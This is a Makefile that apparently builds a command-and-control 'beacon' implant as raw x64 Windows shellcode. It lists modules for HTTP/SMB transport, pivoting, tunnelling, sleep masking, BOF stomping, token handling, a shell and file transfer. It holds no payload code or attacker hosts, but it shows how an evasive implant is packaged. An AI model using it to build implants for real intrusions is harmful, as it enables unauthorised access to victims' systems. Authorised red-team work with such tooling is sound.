# beacon/Makefile - cross-compile PIC beacon → beacon/build/beacon.x64.bin
#
# Source layout:
#   src/Main.c                     - thin heartbeat loop
#   src/Core/{Bootstrap,Ldr,Config,Crypto,Packer}.c
#   src/Transport/{Http,Smb}.c     - HTTP (active) + SMB stub (Phase 7)
#   src/Commands/{Dispatch,Whoami,Sleep}.c
#
# To build with SMB transport:  make NAX_TRANSPORT_PROFILE=1

CC      := x86_64-w64-mingw32-gcc
NASM    := nasm
OBJCOPY   ?= $(shell which x86_64-w64-mingw32-objcopy 2>/dev/null || echo objcopy)

CFLAGS  := -Os -nostdlib -fPIC -fvisibility=hidden \
            -ffunction-sections -fno-omit-frame-pointer \
            -falign-functions=1 -mno-sse -masm=intel \
            -fno-exceptions -fno-builtin \
            -fno-stack-check \
            -MMD -MP \
            -w \
            -Iinclude

ifdef NAX_TRANSPORT_PROFILE
CFLAGS += -DNAX_TRANSPORT_PROFILE=$(NAX_TRANSPORT_PROFILE)
endif

NAX_EXEC_MODE ?= 1

NAX_STOMP_ADVANCED ?= 0
CFLAGS += -DNAX_STOMP_ADVANCED=$(NAX_STOMP_ADVANCED)

# Library linking - SMB variant doesn't need winhttp or iphlpapi
ifeq ($(NAX_TRANSPORT_PROFILE),1)
LINK_LIBS := -lbcrypt
else
LINK_LIBS := -lwinhttp -lbcrypt -liphlpapi
endif

# Transport-specific build directories - HTTP and SMB objects coexist
ifeq ($(NAX_TRANSPORT_PROFILE),1)
BUILD   := build/smb
else
BUILD   := build/http
endif
OUT_EXE := $(BUILD)/beacon.x64.exe
OUT_BIN := $(BUILD)/beacon.x64.bin

ASM_OBJ := $(BUILD)/Entry.obj

# VPATH: Make searches these directories for source files by flat name.
# Ensures Bootstrap.c is found in src/Core/, Http.c in src/Transport/, etc.
VPATH := src:src/Core:src/Transport:src/Commands:src/Bof

# Core sources (both variants)
C_SRCS_CORE := Main.c \
               Bootstrap.c Ldr.c Config.c Crypto.c Packer.c Cfg.c Helpers.c \
               Dispatch.c Whoami.c Sleep.c Core.c Bof.c \
               Screenshot.c Download.c Downloader.c Upload.c MemSave.c Ps.c \
               Loader.c Jobs.c BofStomp.c Sleepmask.c DllNotify.c Shell.c \
               Token.c

# Transport-specific sources
ifeq ($(NAX_TRANSPORT_PROFILE),1)
# SMB variant: pipe transport + pivot (for chained pivots)
C_SRCS_TRANSPORT := Smb.c Pivot.c Tunnel.c
else
# HTTP variant: full HTTP + profile + pivot parent-side
C_SRCS_TRANSPORT := Http.c HttpCodec.c Smb.c PackerProfile.c Profile.c Pivot.c Tunnel.c
endif

C_SRCS_FLAT := $(C_SRCS_CORE) $(C_SRCS_TRANSPORT)

C_OBJS := $(patsubst %.c,$(BUILD)/%.obj,$(C_SRCS_FLAT))

HDRS := $(wildcard include/*.h)
STRUCT_HDRS := $(filter-out include/Config.h include/Config_profile.h include/Config_sleepmask.h,$(HDRS))

.PHONY: all clean link debug-exe debug-pic debug debug-link

all: $(OUT_BIN)

$(BUILD):
	mkdir -p $(BUILD)

$(ASM_OBJ): asm/Entry.x64.asm | $(BUILD)
	$(NASM) -f win64 $< -o $@

$(BUILD)/%.obj: %.c | $(BUILD)
	$(CC) $(CFLAGS) -c $< -o $@

$(OUT_EXE): $(ASM_OBJ) $(C_OBJS) Linker.ld | $(BUILD)
	$(CC) $(CFLAGS) -T Linker.ld \
	    -Wl,--strip-all -Wl,--image-base,0x10000000 \
	    $(ASM_OBJ) $(C_OBJS) -o $@ \
	    $(LINK_LIBS)

OUT_PDATA := $(BUILD)/beacon.pdata.bin
OUT_XDATA := $(BUILD)/beacon.xdata.bin
OUT_RVA   := $(BUILD)/beacon.text_rva

$(OUT_BIN): $(OUT_EXE)
	$(OBJCOPY) --dump-section .text=$@ $<
	$(OBJCOPY) --dump-section .pdata=$(OUT_PDATA) $< 2>/dev/null || true > $(OUT_PDATA)
	$(OBJCOPY) --dump-section .xdata=$(OUT_XDATA) $< 2>/dev/null || true > $(OUT_XDATA)
	@python3 scripts/pe_text_rva.py $< > $(OUT_RVA)
	@touch $@
	@echo "  BIN  $@  ($$(wc -c < $@) bytes)"
	@echo "  PDATA  $(OUT_PDATA)  ($$(wc -c < $(OUT_PDATA)) bytes)"
	@echo "  XDATA  $(OUT_XDATA)  ($$(wc -c < $(OUT_XDATA)) bytes)"
	@echo "  TEXT_RVA  $$(cat $(OUT_RVA))"

# link: recompile Config.obj (picks up new Config.h), then re-link.
# If any header changed since the last full build, rebuild everything instead -
# stale objects with wrong struct offsets cause silent runtime corruption.
link: | $(BUILD)
	@if [ -n "$$(find $(STRUCT_HDRS) -newer $(BUILD)/Config.obj 2>/dev/null)" ] || \
	    [ -n "$$(find src/ -name '*.c' -newer $(BUILD)/Config.obj 2>/dev/null)" ] || \
	    [ asm/Entry.x64.asm -nt $(BUILD)/Entry.obj 2>/dev/null ]; then \
	    echo "  WARN  sources changed - full rebuild required"; \
	    $(MAKE) all; \
	else \
	    $(CC) $(CFLAGS) -c src/Core/Config.c -o $(BUILD)/Config.obj; \
	    $(CC) $(CFLAGS) -T Linker.ld \
	        -Wl,--strip-all -Wl,--image-base,0x10000000 \
	        $(ASM_OBJ) $(C_OBJS) -o $(OUT_EXE) \
	        $(LINK_LIBS); \
	    $(OBJCOPY) --dump-section .text=$(OUT_BIN) $(OUT_EXE); \
	    $(OBJCOPY) --dump-section .pdata=$(OUT_PDATA) $(OUT_EXE) 2>/dev/null || true > $(OUT_PDATA); \
	    $(OBJCOPY) --dump-section .xdata=$(OUT_XDATA) $(OUT_EXE) 2>/dev/null || true > $(OUT_XDATA); \
	    python3 scripts/pe_text_rva.py $(OUT_EXE) > $(OUT_RVA); \
	    echo "  BIN  $(OUT_BIN)  ($$(wc -c < $(OUT_BIN)) bytes)  [link-only]"; \
	fi

clean:
	rm -rf build

# ========= [ debug builds ] =========
#
# debug-exe: CRT-linked EXE whose main() calls NaxMain().
#   NaxDbgx output appears in DebugView / x64dbg "DbgPrint" log.
#	NaxDbg  output appears in console and x64dbg "printf" log.
#   Run on Windows target; no loader needed.
#
# debug-pic: PIC shellcode extracted from .text + .rdata.
#   Load via loader.x64.exe exactly like nax.x64.bin.

DEBUG_CFLAGS := -g -O0 -DDEBUG \
                -mno-sse -masm=intel \
                -fno-exceptions \
                -fno-omit-frame-pointer \
                -w \
                -Iinclude

ifdef NAX_TRANSPORT_PROFILE
DEBUG_CFLAGS += -DNAX_TRANSPORT_PROFILE=$(NAX_TRANSPORT_PROFILE)
endif

DEBUG_CFLAGS += -DNAX_STOMP_ADVANCED=$(NAX_STOMP_ADVANCED)

# debug: PIC shellcode with debug prints baked in - load via loader exactly like
# the release blob.  -Os kept for size; -DDEBUG_PIC guards the CRT main() stub.
DEBUG_PIC_CFLAGS := $(DEBUG_CFLAGS) -Os -DDEBUG_PIC -fPIC -fvisibility=hidden -nostdlib \
                    -ffunction-sections -falign-functions=1 \
                    -fno-builtin -fno-stack-check -MMD -MP

DEBUG_PIC_OBJS := $(patsubst %.c,$(BUILD)/%.dpic.obj,$(C_SRCS_FLAT))
DEBUG_PIC_EXE  := $(BUILD)/beacon.x64.debug.pic.exe
DEBUG_PIC_BIN  := $(BUILD)/beacon.x64.debug.bin

$(BUILD)/%.dpic.obj: %.c | $(BUILD)
	$(CC) $(DEBUG_PIC_CFLAGS) -c $< -o $@

$(DEBUG_PIC_EXE): $(ASM_OBJ) $(DEBUG_PIC_OBJS) Linker.ld | $(BUILD)
	$(CC) $(DEBUG_PIC_CFLAGS) -T Linker.ld \
	    -Wl,--image-base,0x10000000 \
	    $(ASM_OBJ) $(DEBUG_PIC_OBJS) -o $@ \
	    $(LINK_LIBS)

DEBUG_PIC_PDATA := $(BUILD)/beacon.debug.pdata.bin
DEBUG_PIC_XDATA := $(BUILD)/beacon.debug.xdata.bin
DEBUG_PIC_RVA   := $(BUILD)/beacon.debug.text_rva

$(DEBUG_PIC_BIN): $(DEBUG_PIC_EXE)
	$(OBJCOPY) --dump-section .text=$@ $<
	$(OBJCOPY) --dump-section .pdata=$(DEBUG_PIC_PDATA) $< 2>/dev/null || true > $(DEBUG_PIC_PDATA)
	$(OBJCOPY) --dump-section .xdata=$(DEBUG_PIC_XDATA) $< 2>/dev/null || true > $(DEBUG_PIC_XDATA)
	@python3 scripts/pe_text_rva.py $< > $(DEBUG_PIC_RVA)
	@touch $@
	@echo "  DEBUG  $@  ($$(wc -c < $@) bytes)"
	@echo "  PDATA  $(DEBUG_PIC_PDATA)  ($$(wc -c < $(DEBUG_PIC_PDATA)) bytes)"
	@echo "  XDATA  $(DEBUG_PIC_XDATA)  ($$(wc -c < $(DEBUG_PIC_XDATA)) bytes)"

debug: $(DEBUG_PIC_BIN)

# debug-link: recompile Config.dpic.obj, then re-link debug build.
# Falls back to full debug rebuild if headers changed since last build.
debug-link: | $(BUILD)
	@if [ -n "$$(find $(STRUCT_HDRS) -newer $(BUILD)/Config.dpic.obj 2>/dev/null)" ] || \
	    [ -n "$$(find src/ -name '*.c' -newer $(BUILD)/Config.dpic.obj 2>/dev/null)" ] || \
	    [ asm/Entry.x64.asm -nt $(BUILD)/Entry.obj 2>/dev/null ]; then \
	    echo "  WARN  sources changed - full debug rebuild required"; \
	    $(MAKE) debug; \
	else \
	    $(CC) $(DEBUG_PIC_CFLAGS) -c src/Core/Config.c -o $(BUILD)/Config.dpic.obj; \
	    $(CC) $(DEBUG_PIC_CFLAGS) -T Linker.ld \
	        -Wl,--image-base,0x10000000 \
	        $(ASM_OBJ) $(DEBUG_PIC_OBJS) -o $(DEBUG_PIC_EXE) \
	        $(LINK_LIBS); \
	    $(OBJCOPY) --dump-section .text=$(DEBUG_PIC_BIN) $(DEBUG_PIC_EXE); \
	    $(OBJCOPY) --dump-section .pdata=$(DEBUG_PIC_PDATA) $(DEBUG_PIC_EXE) 2>/dev/null || true > $(DEBUG_PIC_PDATA); \
	    $(OBJCOPY) --dump-section .xdata=$(DEBUG_PIC_XDATA) $(DEBUG_PIC_EXE) 2>/dev/null || true > $(DEBUG_PIC_XDATA); \
	    python3 scripts/pe_text_rva.py $(DEBUG_PIC_EXE) > $(DEBUG_PIC_RVA); \
	    echo "  DEBUG  $(DEBUG_PIC_BIN)  ($$(wc -c < $(DEBUG_PIC_BIN)) bytes)  [link-only]"; \
	fi

# gcc auto-dependency files (-MMD -MP)
C_DEPS         := $(C_OBJS:.obj=.d)
DEBUG_PIC_DEPS := $(DEBUG_PIC_OBJS:.obj=.d)
-include $(C_DEPS)
-include $(DEBUG_PIC_DEPS)
